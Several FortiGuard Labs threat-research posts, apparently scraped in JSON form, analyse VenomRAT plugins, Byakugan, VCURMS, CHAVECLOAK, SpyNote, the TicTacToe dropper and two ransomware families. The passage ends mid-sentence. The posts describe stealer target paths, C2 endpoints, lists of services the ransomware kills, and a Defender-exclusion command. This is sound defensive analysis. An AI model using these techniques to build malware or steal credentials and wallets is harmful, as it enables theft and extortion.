The next stage of the PowerShell code resides at the end of the decoded “Universallsningen.lpk” file. Despite containing numerous junk comments to obfuscate analysis, the PowerShell script uses the Process Hollowing technique to inject shellcode into a legitimate process. Following injection and environment verification, the shellcode executes the final malware, XWorm. In this attack scenario, GuLoader also deploys NanoCore and Remcos. Remcos is a Remote Access Trojan (RAT) first appearing in 2016. It is marketed as legitimate software for remote management but is often used maliciously. Remcos can give attackers complete control over an infected system, allowing them to capture keystrokes, screenshots, credentials, and other sensitive information. It is typically delivered via malicious documents or archive files and has been seen in phishing campaigns. This plugin was distributed from VenomRAT’s C2 using three methods: an obfuscated VBS script named “remcos.vbs”, ScrubCrypt, and Guloader PowerShell. The configuration for Remcos is RC4 encrypted in the“SETTINGS”resource, and the decrypted data is shown in Figure 42. This plugin is not only deployed via the obfuscated VBS script mentioned in the previous section but it is also embedded in a .NET execution file obfuscated using SmartAssembly. The .NET execution file decodes the next stage payload from the Resource file “ach” and writes the data into the memory. It then copies itself to the TEMP folder and sets this copied file to the scheduled task named “Nano.” This task repeats every 10 minutes after the first trigger. The next stage payload is more straightforward. It contains a hardcoded array for the malicious DLL file for stealing the victim’s sensitive data. The DLL file stores its configuration in Base64 encoded data, including the C2 hostname and the certificate to encrypt the communication. This DLL file keeps monitoring the user’s system and aims for specific crypto wallets, Foxmail, and telegram data by performing the following tasks repeatedly: 1.     Gathers details about the victim's environment, such as the PC name, username, antivirus software, disk information, and operating system version. 2.     Verifies the existence of the following paths: “\"%AppData%\\atomic\\Local Storage\\leveldb” “%AppData%\\Electrum\\wallets,” “%AppData%\\Ethereum\\keystore,” “%AppData%\\Exodus\\exodus.wallet,” “%AppData%\\com.liberty.jaxx\\IndexedDB,” “%AppData%\\Zcash,” “%AppData%\\Foxmail” and “%AppData%\\Telegram Desktop\\Telegram.exe”. 3.     Checks if the following registry exists: “Software\\Bitcoin\\Bitcoin-Qt,” “Software\\Dash\\Dash-Qt” and “Software\\Litecoin\\Litecoin-Qt. “ 4.     Once collected, the targeted data sends the data appended with the execution file path at the end to the C2 server, “markjohnhvncpure[.]duckdns.org.” This analysis reveals a sophisticated attack leveraging multiple layers of obfuscation and evasion techniques to distribute and execute VenomRAT via ScrubCrypt. The attackers employ a variety of methods, including phishing emails with malicious attachments, obfuscated script files, and Guloader PowerShell, to infiltrate and compromise victim systems. Furthermore, deploying plugins through different payloads highlights the versatility and adaptability of the attack campaign. The attackers’ ability to persist in the system, evade detection, and execute malicious payloads underscores the importance of robust cybersecurity measures and vigilant monitoring to mitigate such threats effectively.

    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The stolen information can be used for future attackSeverity Level:High In January 2024, FortiGuard Labs collected a PDF file written in Portuguese that distributes a multi-functional malware known as Byakugan. While investigating this campaign,a reportabout it was published. Therefore, this report will only provide a brief analysis of the overlap between that attack and this and focus primarily on the details of the infostealer. The PDF image shows a blurred table and asks the victim to click the malicious link on the PDF file to see the content. Once the link is clicked, a downloader is downloaded. The downloader drops a copy of itself (require.exe) along with a clean installer to the temp folder. It then downloads a DLL (dynamic link library), which is executed via DLL-hijacking to run require.exe to download the main module (chrome.exe). It executes the downloader's copy (require.exe), not the downloader (Reader_Install_Setup.exe), because when the downloader is named \"require.exe\" and located in the temp folder, its behavior is different from when it is Reader_Install_Setup.exe. The downloader downloads Byakugan’s main module from thinkforce[.]com[.]br. This is the C2 server from which Byakugan receives files and commands. However, it may also work as the attacker's control panel. There is a login page on port 8080. We found descriptions of its features from the page's source code. Byakugan is a node.js-based malware packed into its executable by pkg. In addition to the main script, there are several libraries corresponding to features. Additionally, Byakugan can download extra files to perform its functions. These are stored in the default base path, % APPDATA%ChromeApplication, which is also used to store data created by Byakugan. Byakugan has the following features: In a previous variant (7435f11e41735736ea95e0c8a66e15014ee238c3a746c0f5b3d4faf4d05215af), Byakugan downloaded the software from its domain. But this is not seen in this newer variant. In addition, there are some features that help Byakugan live as long as possible: In addition, it sets the path it uses to the Windows Defender’s exclusion path and allows files in the Windows firewall. There is a growing trend to use both clean and malicious components in malware, and Byakugan is no exception. This approach increases the amount of noise generated during analysis, making accurate detections more difficult. However, the downloaded files provided critical details about how Byakugan works, which helped us analyze the malicious modules. FortiGuard Labs will continue to monitor this malware and provide updates on this variant as they become available.

    "content": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the RA World ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Steals and encrypts victims' files and demands ransom for file decryption and not releasing the stolen data.Severity level:High The RA World ransomware was first submitted to a publicly available file scanning service in early December 2023. The threat actor steals victims' data before deploying and running its ransomware malware for file encryption. The group operates both TOR and non-TOR sites where victims' stolen data has been leaked. The ransomware is also designed to delete Volume Shadow Copies and system backups to inhibit system recovery. Information on the infection vector used by the RA World ransomware threat actor is unavailable. However, it is not likely to differ significantly from other ransomware groups. The RA World ransomware samples were submitted to a publicly available file scanning service from the Netherlands, France, the United Kingdom, the Czech Republic, Poland, Colombia, and Japan. The ransomware's data leak sites list 23 victims at the time of this writing. The listed victims are located in Germany, the UK, the US, Italy, Poland, India, Taiwan, Mexico, France, Thailand, and Korea. The first available RA World sample (SHA2: 4866d6994c2f8b4dadfaabc2e2b81bd86c12f68fdf0da13d41d7b0e30bea0801) performs the following actions: It stops the following services: vss svc$ memtas sophos veeam backup mepocs GxVss GxBlr GxFWD GxCVD GxCIMgr DefWatch ccEvtMgr ccSetMgr SavRoam RTVscan QBFCService QBIDPService Intuit.QuickBooks.FCS QBCFMonitorService YooBackup YooIT zhudongfangyu stc_raw_agent VSNAPVSS VeeamTransportSvc VeeamDeploymentService VeeamNFSSvc PDVFSService BackupExecVSSProvider BackupExecAgentAccelerator BackupExecAgentBrowser BackupExecDiveciMediaService BackupExecJobEngine BackupExecManagementService BackupExecRPCService AcrSch2Svc AcronisAgent CASAD2DWebSvc CAARCUpdateSvc It terminates the following processes: sql.exe oracle.exe ocssd.exe dbsnmp.exe synctime.exe agntsvc.exe isqlplussvc.exe xfssvccon.exe mydesktopservice.exe ocautoupds.exe encsvc.exe firefox.exe tbirdconfig.exe mydesktopqos.exe ocomm.exe dbeng50.exe sqbcoreservice.exe excel.exe infopath.exe msaccess.exe mspub.exe onenote.exe outlook.exe powerpnt.exe steam.exe thebat.exe thunderbird.exe visio.exe winword.exe wordpad.exe notepad.exe The ransomware uses the following commands to delete Volume Shadow Copies: The malware encrypts files on the victims’ machines and adds the following extension to the encrypted files: It then drops the ransom note “Data breach warning.txt,“ which includes the following information: The ransomware excludes the following filetypes from file encryption: .exe .dll .RAWLD .iso .msi .bin It excludes the following files and folders from file encryption: AppData Boot Windows SYSVOL Tor Browser Internet Explorer Google Opera Opera Software Mozilla Mozilla Firefox $Recycle.Bin ProgramData All Users autorun.inf boot.ini bootfont.bin bootsect.bak bootmgr bootmgr.efi bootmgfw.efi desktop.ini $windows.~ws system volume information intel msocache perflogs iconcache.db ntldr ntuser.dat ntuser.dat.log ntuser.ini thumbs.db Program Files Program Files (x86) #recycle config.msi $windows.~bt The ransomware uses the following specific mutex: Based on this RA World ransomware sample, the following assumption can be made: For example, another RA World ransomware sample (SHA2: 51da3acc6c7089bd0f1df9d9902e183db0d1342552404c3c1b898b168399b0bc) claims to have been compiled on Aug 24 17:56:57 2022 GMT, however this sample did not appear on the file scanning site until February 2, 2024. Its ransom note lists fewer unpaid victims, indicating that the sample was created after 4866d6994c2f8b4dadfaabc2e2b81bd86c12f68fdf0da13d41d7b0e30bea0801. A minor variant of the RA World ransomware (SHA2: 9479a5dc61284ccc3f063ebb38da9f63400d8b25d8bca8d04b1832f02fac24de) became available at the end of January 2024. This variant performs the identical actions as 4866d6994c2f8b4dadfaabc2e2b81bd86c12f68fdf0da13d41d7b0e30bea0801 except for the following: A few days later, yet another minor RA World ransomware variant (SHA2: 31ac190b45cc32c04c2415761c7f152153e16750516df0ce0761ca28300dd6a4) became available. This variant also performs the identical actions as the previously mentioned RA World ransomware samples except for the following: As mentioned above, the RA World ransomware group operates both TOR and non-TOR sites to publish stolen data. The site includes the following statement, which provides a clue to the group's location: War is death’s feast. I survived, but my friend didn’t. Below is an example of a page created for one of the victims: The RA World ransomware described in this report are detected and blocked by FortiGuard Antivirus as: FortiGate, FortiMail, FortiClient, and FortiEDR support theFortiGuard AntiVirus service.

Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREEFortinet Certified Fundamentals (FCF)in Cybersecurity training. The training is designed to help end users learn about today's threat landscape and will introduce basic cybersecurity concepts and technology. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. FortiReconis a SaaS based Digital Risk Prevention Service backed by cybersecurity experts to provide unrivaled threat intelligence on the latest threat actor activity across the dark web, providing a rich understanding of threat actors’ motivations and TTPs. The service can detect evidence of attacks in progress allowing customers to rapidly respond to and shut down active threats. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aUS Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. OurIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Additionally,FortiRecon Digital Risk Protection (DRP)is a SaaS-based service that provides a view of what adversaries are seeing, doing, and planning to help you counter attacks at the reconnaissance phase and significantly reduce the risk, time, and cost of later-stage threat mitigation.

    "link": "https://www.fortinet.com/blog/threat-research/vcurms-a-simple-and-functional-weapon",
    "content": "FortiGuard Labs Threat Research Affected platforms:All platforms with Java installedImpacted parties:Any organizationImpact:Attackers gain control of the infected systemsSeverity level:High Recently, FortiGuard Labs uncovered a phishing campaign that entices users to download a malicious Java downloader with the intention of spreading new VCURMS and STRRAT remote access trojans (RAT). The attackers stored malware on public services like Amazon Web Services (AWS) and GitHub, employing a commercial protector to avoid detection of the malware. The attacker attempts to use email as its command and control throughout the attack campaign. The receiving endpoint utilizes Proton Mail, which offers email services that include privacy protection. Figure 1 shows the attack chain. This blog describes how the malware is delivered and specifically examines the unusual VCURMS RAT that is involved in this campaign. The phishing email shown in Figure 2 is part of this attack campaign. It targets staff members, implying that a payment is underway and encourages them to click a button to verify payment information. Upon clicking the button, a harmful JAR file hosted on AWS is downloaded to the victim's computer. The downloaded files resemble typical phishing attachments with spoofed names intended to lure people into opening them. When you look at the file with a JAR decompiler, many strings are obfuscated and one of the class names “DownloadAndExecuteJarFiles.class” clearly indicates the intention of this program, as shown in Figure 3. The program aims to download two JAR files to the attacker-provided path and executes them. As shown in Figure 4, a class employed by the obfuscator is labeled \"sense loader\" in the debug data. The obfuscator selects the appropriate native loader module from the resources based on the current operating system during the execution process. After a specific date, running the malware causes a notification to appear regarding the expiration of the trial for protected tools as shown in Figure 5. Additionally, the code generated by the obfuscator closely resembles the code produced by a legitimate obfuscation tool known as \"Sense Shield Virbox Protector\" as shown in Figure 6. The rest of the execution flow of the JAR file downloads two additional JAR files and runs them separately. We observed an unusual RAT that communicates with its command and control through email. During the initialization step, the program replicates itself into the Startup folder to ensure that it runs automatically when Windows starts. It then alerts the attacker that the victim is online and establishes a schedule to periodically check the mailbox as shown in Figure 7. The attacker identifies the victim using the computer name and Volume ID. When the malware needs to verify the command provided by the attacker, it first examines whether the subject of the email contains identifying information and then proceeds to check the command within the body of the email. The keylogger and password recovery malware are also hosted on AWS and disguised with a .jpg extension. They are downloaded using a PowerShell command. In addition to installing keyloggers and password recovery malware, the command provides various customizable features such as the ability to execute shell commands and upload and download files as shown in Table 1. Command Details get information Retrieve system details such as the operating system version, memory capacity, computer name, volume ID, username, country, and the files in the Desktop and Documents folders. shell Obtain the command and execute it throughcmd.exe /c;the result is sent back to the attacker via email. recovery Download arecoveryJAR file with a .jpg extension and execute it. start keylogger Download akeyloggerJAR file with a .jpg extension and execute it. get keylogger Attach the keylogger data and send it as an attachment. upload Compress the file at the specified location and then send it as an attachment. download Retrieve the attachment and only allow file extensions that are in .jpg format to be accepted. search Look for file names containing keywords specified by the attacker. Table 1: Commands The most downloaded malware in this campaign are obfuscated using the Branchlock obfuscator. Information about this obfuscator is located at the end of the JAR file as shown in Figure 10. TheNarumii/Deobfuscatorplays a crucial role in partially supporting the deobfuscation of a program obfuscated with Branchlock. When the command \"recovery\" is received, the program is downloaded and deployed into the %USERPROFILE%\\AppData\\cookie directory with the name st.jar. The primary purpose of the program is to steal information, particularly system information, popular browsers, and apps. The program gathers account information from apps and collects cookies, autofill data, browsing history, and passwords from browsers. The data collected is stored in the directory located at %USERPROFILE%/<username>. Despite the component similarities to Rude Stealer, a Java-based infostealer, this program adopts the name VCURMS. We also have observed a distinction in the method of transmitting the pilfered data. The attacker follows the same path as the main program and sends the stolen information through the same email address. The downloaded keylogger will ultimately be stored in %USERPROFILE%\\AppData\\cookie\\klog.jar. This file is responsible for recording keystrokes. Additional actions such as sending logs back to the attacker requires the main JAR file \"windows.jar\" to execute the functions. STRRAT is a RAT built using Java, which has a wide range of capabilities, such as serving as a keylogger and extracting credentials from browsers and applications. By the end of 2023, it was discovered that STRRAT utilizes two string obfuscation techniques, namely \"Zelix KlassMaster (ZKM)\" and \"Allatori\" to avoid detection. However, the STRRAT observed in this attack campaign follows the same convoluted process. It uses the Allatori Java obfuscator and includes the Branchlock obfuscator, which makes analysis more difficult. The configuration file still remains in the resource. By decoding it using Base64 and decrypting it with the AES Algorithm using the passphrase \"strigoi,\" we can obtain information about the command and control server and ID “Khonsari.” This comprehensive attack operation deploys several malicious programs simultaneously on a victim’s system. It deploys a well-known STRRAT and a new VCURMS based on Java. Even though the VCURMS RAT primarily handles command and control communication, it also includes a modified version of a Rude Stealer and a keylogger in its second phase to gather sensitive data from the victim's system. We discovered that the threat actor was using multiple obfuscation techniques to avoid detection and attempting to use email for communicating with the command and control server.

    "title": "New Banking Trojan “CHAVECLOAK” Targets Brazil",
    "link": "https://www.fortinet.com/blog/threat-research/banking-trojan-chavecloak-targets-brazil",
    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:Controls victim’s device and collects sensitive informationSeverity Level:High FortiGuard Labs recently uncovered a threat actor employing a malicious PDF file to propagate the banking Trojan CHAVECLOAK. This intricate attack involves the PDF downloading a ZIP file and subsequently utilizing DLL side-loading techniques to execute the final malware. Notably, CHAVECLOAK is specifically designed to target users in Brazil, aiming to steal sensitive information linked to financial activities. Figure 1 shows the detailed flow of this cyber threat. In the South American cyberthreat landscape, banking trojans employ a range of tactics, such as phishing emails, malicious attachments, and browser manipulation. Notable examples include Casbaneiro (Metamorfo/Ponteiro), Guildma, Mekotio, and Grandoreiro. These trojans specialize in illicitly obtaining online banking credentials and personal data, posing a significant threat to users in countries like Brazil and Mexico. The CHAVECLOAK's Command and Control (C2) server telemetry is shown in Figure 2. In this blog, we will elaborate on the details of the malware. The PDF, shown in Figure 3, claims contain documents related to a contract, with instructions written in Portuguese. It lures its victims to click a button so they can read and sign the attached documents. However, a malicious downloader link is discreetly embedded within the stream object, as shown in Figure 4, which reveals the decoded URL. This URL undergoes processing via the free link shortening service “Goo.su,” ultimately leading to a redirect at hxxps://webattach.mail.yandex.net/message_part_real/NotaFiscalEsdeletronicasufactrub66667kujhdfdjrWEWGFG09t5H6854JHGJUUR[.]zip for downloading the ZIP file. Upon decompression, the file yields the MSI file “NotafiscalGFGJKHKHGUURTURTF345.msi.” Following the decompression of the MSI installer, we uncovered multiple TXT files related to settings for different languages, a legitimate execution file, and a malicious DLL named “Lightshot.dll.” Notably, the modified date for this DLL file is more recent than that of all the other files in the installer, further emphasizing its unusual nature. Examining the MSI installer reveals its entire configuration, which is written in Portuguese. It executes the file “Lightshot.exe,” extracting and depositing files at “%AppData%\\Skillbrains\\lightshot\\5.5.0.7,” as shown in Figure 6. The file “Lightshot.exe” then deploys DLL sideloading techniques to activate the execution of the malicious DLL, \"Lightshot.dll.\" This technique lets the legitimate executable load and run the malicious code discreetly, facilitating unauthorized activities like data theft. The actions conducted by “Lightshot.dll” involve covert and harmful operations, including the unauthorized acquisition of sensitive information. DLL sideloading poses a significant security threat by allowing the malware to exploit legitimate processes for nefarious purposes without detection. Initially, the process invokes “GetVolumeInformationW” to gather details about the file system and the associated volume related to the specified root directory. It utilizes the HEX value obtained to generate a log file in “%AppData%[HEX ID]lIG.log.” Following this, it adds a registry value named “Lightshot” to “HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run,” ensuring automatic execution of the “Lightshot.exe” program upon user login. Once logging and persistence are completed, it sends an HTTP request to hxxp://64[.]225[.]32[.]24/shn/inspecionando.php. If geo-checking confirms that the victim is in Brazil, it logs data on the server, accessible through the path “clients.php,” as shown in Figure 8. It then periodically monitors the foreground window using the APIs “GetForegroundWindow” and “GetWindowTextW.” Upon identifying a window and confirming its name against a predefined list of bank-related strings, the malware establishes communication with its Command and Control (C&C) server. The malware facilitates various actions to steal a victim's credentials, such as allowing the operator to block the victim's screen, log keystrokes, and display deceptive pop-up windows, as shown in Figure 10. The malware actively monitors the victim's access to specific financial portals, including several banks and Mercado Bitcoin, which encompasses both traditional banking and cryptocurrency platforms. After obtaining the user's entered login data, the malware initiates communication with its Command and Control (C2) server at hxxp://comunidadebet20102[.]hopto[.]org. Depending on the bank associated with the stolen data, it uploads the information to distinct paths: “04/M/” for Mercado Bitcoin. It then transmits a POST request containing essential system details and configures the account information within the “InfoDados” parameter, as seen in Figure 12. Additionally, we acquired an older variant of CHAVECLOAK from the check-in site. Its process differs from the previous one, as the ZIP file contains a Delphi executable file embedding the final payload in the RCData section. It begins by retrieving system information to establish a new folder and stores the payload at “C:\\Program Files (x86)\\Editor-GH-[HEX ID]\\Editor-[HEX ID].exe.” Simultaneously, it creates a log file, establishes persistence, and utilizes the PowerShell command “Add-MpPreference –ExclusionPath” to exclude the path “Editor-GH-[HEX ID]” from Windows Defender scans. Subsequently, it sends a check-in request to hxxp://64[.]225[.]32[.]24/desktop/inspecionando.php. Notably, this variant appears to be an earlier version, indicated by the victims' check-in date starting in 2023. It also actively observes user behavior, captures front window text, and harvests personally identifiable information from specified banking and Bitcoin login pages, including names, passwords, and keystrokes. It then transmits the stolen data to the Command and Control (C2) server at hxxp://mariashow[.]ddns[.]net/dtp/cnx.php. The emergence of the CHAVECLOAK banking Trojan underscores the evolving landscape of cyberthreats targeting the financial sector, specifically focusing on users in Brazil. Utilizing sophisticated techniques, including malicious PDFs, ZIP file downloads, DLL sideloading, and deceptive pop-ups, it joins a cohort of prominent banking trojans that primarily target South America. CHAVECLOAK employs Portuguese language settings, indicating a strategic approach to the region, and actively monitors victims' interactions with financial portals. CHAVECLOAK exemplifies the sophistication of contemporary banking trojans, necessitating continual vigilance and proactive cybersecurity measures to safeguard against evolving threats within the financial landscape of South America.

    "content": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the Abyss Locker (AbyssLocker) ransomware. Affected platforms:Microsoft Windows, LinuxImpacted parties:Microsoft Windows and Linux UsersImpact:Steals and encrypts victims' files and demands ransom for file decryption and not releasing the stolen data.Severity level:High Although the first Abyss Locker sample was submitted to a publicly available file scanning service in July of 2023, the first variant of the ransomware may date back further as the ransomware is based on the HelloKitty ransomware source code. A version 1 variant of the Abyss Locker ransomware targeting Windows systems was discovered in early January 2024, followed by version 2 for Windows later that month. (We were unable to locate version 1 for Linux.) We review both the Linux and Windows variants in this week’s roundup. The Abyss Locker threat actor steals victims' data before deploying and running its ransomware malware for file encryption. The ransomware is also capable of deleting Volume Shadow Copies and system backups. Information on the infection vector used by the Abyss Locker ransomware threat actor is unavailable. However, it is not likely to differ significantly from other ransomware groups.

The Abyss Locker version 1 variant for Windows adds a random five-letter extension instead of “.abyss.” The ransomware drops a ransom note labeled “WhatHappened.txt.” The TOR site used for ransom negotiations was not accessible at the time of our investigation. It then replaces the desktop wallpaper with its own, which contains a ransom message: However, the following file encryption exception applies to the Abyss Locker ransomware: It skips encrypting files with the following extensions: .Abyss .386 .cmd .ani .adv .msi .msp .com .nls .ocx .mpa .cpl .mod .hta .prf .rtp .rpd .bin .hlp .shs .drv .wpx .bat .rom .msc .spl .msu .ics .key .exe .dllv .lnk .icov .sys .cur .idx .ini .reg .mp3 .mp4 .apk .ttf .otf .fon .fnt .dmp .tmp .pif .wav .wma .dmg .iso .app .ipa .xex .wad .icns .lock .theme .diagcfg .blf .diagcab .diagpkg .msstyles .gadget .woff .part .sfcache .winmd It also skips encrypting the following files: work.log autorun.inf boot.ini bootfont.bin bootsect.bak bootmgr bootmgr.efi bootmgfw.efi desktop.ini iconcache.db ntldr ntuser dat ntuser.dat.log ntuser.ini thumbs.db !CryptoLockerDetectionDONT-DELETE!.jpg WhatHappened.txt In addition, it avoids encrypting files in the following folders: Boot Windows Windows.old $Windows.~bt $windows.~ws windows nt msbuild microsoft perflog Microsoft – Cloud Computers Apps & Gaming microsoft shared common files windows defender windowspowershell windows security usoshared windowsapp windows journal windows photo viewer $Recycle.Bin All Users Program Files Program Files (x86) system volume information msocache Tor Browser Internet Explorer Google Opera Opera Software Mozilla Mozilla Firefox #recycle Our analysis of Abyss Locker ransomware version 2, which appeared in late January 2024, found no differences from version 1 in terms of functionality. The only differences we could find are the ransom message (including the message on the replaced wallpaper), which clearly states that it's version 2, and the TOR address used for ransom negotiation. The TOR site used by this version of Abyss Locker ransomware for ransom negotiation was still accessible at the time of our investigation. This ransomware variant runs the following run commands: The ransomware then encrypts files on the compromised machines and adds a “.crypt” extension to the encrypted files. It then creates files with a “.README_TO_RESTORE” extension, which is a ransom note. It avoids encrypting files in the following directories: /boot /dev /etc /lost+found /proc /run /usr/bin /usr/include /usr/lib /usr/lib32 /usr/lib64 /usr/sbin /sys /usr/libexec /usr/share /var/lib It also avoids encrypting files with the following extensions: .vmdk .vmsd .vmsn .crypt .README_TO_RESTORE .tmp .a .so .la Currently, the Abyss Locker ransomware threat actor does not appear to have a TOR site that exposes the victim's name and allows others to view the stolen data, although BleepingComputer previouslyreportedsuch a leak site in mid-2023. However, the threat actor does offer a ransom negotiation site on TOR. The ransom is set low for businesses and high for consumers ($282,380 in this case), making it difficult to determine who is being targeted. The Abyss Locker ransomware described in this report are detected and blocked by FortiGuard Antivirus as: FortiGate, FortiMail, FortiClient, and FortiEDR support theFortiGuard AntiVirus service. The FortiGuard AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected.

Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREEFortinet Certified Fundamentals (FCF)in Cybersecurity training. The training is designed to help end users learn about today's threat landscape and will introduce basic cybersecurity concepts and technology. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. FortiReconis a SaaS based Digital Risk Prevention Service backed by cybersecurity experts to provide unrivaled threat intelligence on the latest threat actor activity across the dark web, providing a rich understanding of threat actors’ motivations and TTPs. The service can detect evidence of attacks in progress allowing customers to rapidly respond to and shut down active threats. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aUS Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal.

    "content": "FortiGuard Labs Threat Research Affected Platform:AndroidImpacted Users:Android users with mobile crypto wallet or banking applicationsImpact:Financial LossSeverity Level:Medium Spynoteis a Remote Access Trojan that initially surfaced in 2020. Since then, it has grown into one of the most common families of malware for Android, with multiple samples, integration of other RATs (e.g. CypherRat), and a large family of over 10,000 samples. There are multiple variants and integrations of other RATs, and since 2023 there has been agrowing interestinfinancial institutions. On February 1st, we found a malicious sample posing as a legitimate crypto wallet that actually included the SpyNote RAT with several interesting additions related to anti-analysis andcryptocurrencies. Like much Android malware today, this malware abuses theAccessibility API. This API is used to automatically perform UI actions. For example, the malicious sample uses the Accessibility API to record device unlocking gestures. Newer, this SpyNote sample uses the Accessibility API to target famous crypto wallets. The following code recognizes the use of a legitimatecrypto walletand displays anoverlayover it. The injected overlay consists of a WebView whose HTML is hard-coded in Base64. If we decode the overlay, we get anHTML page for cryptocurrency transfers. Notice that the page apparently initiates a transfer between 2 hard-coded fake wallets. See below: the “…” in between the alleged wallet addresses are exactly as in the code (note that we censored the full addresses). For the malware analyst, it’s obvious they are fake.  However, it is likely the victim won’t notice because (1) the wallet identifiers always have many characters and are therefore difficult to verify, and (2) this will look as if it were displayed by the victim’s legit crypto wallet application (in reality, it is displayedoverthe real crypto wallet app, but this is not detectable). In addition, the malicious code uses the Accessibility API toautomatically fill a form and transfer a given amount of cryptocurrency to the cybercriminals. Precisely, the code performs the following tasks: All of these operations are performedautomaticallythrough the Accessibility APIwithout the user’s intervention. To gain access to the Accessibility API, all malware lure victims one way or another into giving them the necessary rights. This sample follows the same strategy. We remind end-users that they should never do this. While the Accessibility API is rightfully requested by apps to help people with disabilities, they should always be treated as highly suspicious coming from alleged crypto wallets, PDF Readers, Video Players, etc. The 2 screenshots below show (1) the SpyNote malware requesting Accessibility Service and (2) how, when you grant the desired access, the Android OS displays an additional warning window explaining the risks. It is still possible at that point to click on “Deny,” and the malware won’t gain access. Unfortunately, as soon as the victim clicks on “Allow,” it is basically “game over” because the malware can navigate, click, read, and modify any application. Besides injections into crypto wallets, the sample features an interesting, simple, but efficient anti-analysis technique. We remind users that Android Packages (APK) areZIPfiles and normally contain a Dalvik executable (classes.dex), a manifest (AndroidManifest.xml), resources, and assets. In this particular case, the sample ismalformatted: several resource files are meant to be present in the subdirectories of classes.dex and AndroidManifest.xml. But classes.dex and AndroidManifest.xml arefiles, notdirectories. Consequently, standard unzip tools fail with lots of errors, which complicates the automated analysis of the sample. After a growing interest in financial institutions,this new Android/SpyNote sample shows that malware authors are now taking into account cryptocurrencies.The capabilities of the malware are well beyond the mere spying of credentials as they can initiate cryptocurrency transfers. As for anti-analysis,while the implemented technique is simple and by-passable by a human analyst, it certainly defeats—or complicates—automated analysis, giving the malware author a little more time before detection. The sample is detected automatically by our products, and we urge Android users to pay particular attention to any application requesting the Accessibility API. Fortinet customers are already protected from this malware variant through our AntiVirus as follows: FortiGuard Labs detects the sample with the following AV signatures: Android/SpyNote.F!tr TheFortiGuard AntiVirus serviceis supported by FortiGate, FortiMail, FortiClient, and FortiEDR.

    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft Windows UsersImpact:This loader has been used to load multiple RATs and info stealers, which can lead to compromised credentials and enable further malicious activitiesSeverity Level:Medium While analyzing malware samples collected from several victims, the FortiGuard team identified a grouping of malware droppers used to deliver various final-stage payloads throughout 2023. Malware droppers are malicious software designed to deliver and execute additional malware on a victim system and are employed to obfuscate final payloads during load and initial execution. Droppers within this group employ multiple stages of obfuscated payloads loading reflectively in memory. Some of the final stage payloads we identified include Leonem, AgentTesla, SnakeLogger, RemLoader, Sabsik, LokiBot, Taskun, Androm, Upatre, and Remcos. We have named this group of payloads ‘TicTacToe dropper’ due to a common Polish language string, ‘Kolko_i_krzyzyk,’ found in multiple earlier samples of the dropper, which translates to TicTacToe in English. While not all versions of this group of droppers contain this string, commonalities in their behavior led us to this grouping. We analyzed multiple samples of this dropper. The executable malware file was usually delivered through an .iso file. From cases directly observed in the wild, these iso files were delivered to the victim via phishing as an attachment (T1566.001). This technique of packing malware inside an iso file is 